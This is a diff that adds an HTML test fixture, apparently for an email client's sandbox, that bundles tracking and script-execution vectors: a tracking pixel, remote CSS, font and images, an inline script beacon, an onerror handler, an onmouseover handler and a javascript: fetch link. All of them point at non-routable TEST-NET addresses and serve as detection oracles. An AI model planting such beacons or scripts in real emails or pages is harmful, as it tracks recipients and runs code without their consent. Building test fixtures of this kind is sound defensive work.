@@ -1,0 +1,44 @@
+<!doctype html>
+<html>
+  <head>
+    <!-- Every vector points at a DISTINCT 203.0.113.x host (TEST-NET-3, RFC 5737: non-routable,
+         safe) so each connect() is attributable in strace and coalescing can't hide one.
+         The key oracle is .7 (inline script): a connect to it proves JavaScript executed. -->
+    <link rel="stylesheet" href="http://203.0.113.10/remote.css" />
+    <style>
+      @font-face {
+        font-family: leak;
+        src: url("http://203.0.113.11/leak.woff2");
+      }
+      body {
+        background: url("http://203.0.113.12/bg.png");
+        font-family: leak, sans-serif;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Adversarial email</h1>
+    <p>This message bundles every tracking and code-execution vector.</p>
+
+    <!-- .5 static tracking pixel (no JS) — privacy oracle -->
+    <img src="http://203.0.113.5/pixel.gif?uid=victim" width="1" height="1" alt="" />
+
+    <!-- .6 remote content image -->
+    <img src="http://203.0.113.6/banner.png" alt="banner" />
+
+    <!-- .7 inline script beacon — JS-EXECUTION ORACLE (a connect to .7 proves JS ran) -->
+    <script>
+      // network-independent oracle: fires iff this hostile page script executes
+      window.ipc.postMessage("PAGE-SCRIPT-RAN");
+      new Image().src = "http://203.0.113.7/script-ran";
+      document.title = "PWNED";
+    </script>
+
+    <!-- .8 onerror handler beacon (fast-failing scheme so it fires without waiting on network) -->
+    <img src="bad-scheme://x" onerror="new Image().src='http://203.0.113.8/onerror-ran'" />
+
+    <!-- .9 onmouseover and .13 javascript: link need user interaction; they should not fire -->
+    <div onmouseover="new Image().src='http://203.0.113.9/onmouseover'">hover</div>
+    <a href="javascript:fetch('http://203.0.113.13/jslink')">click</a>
+  </body>
+</html>
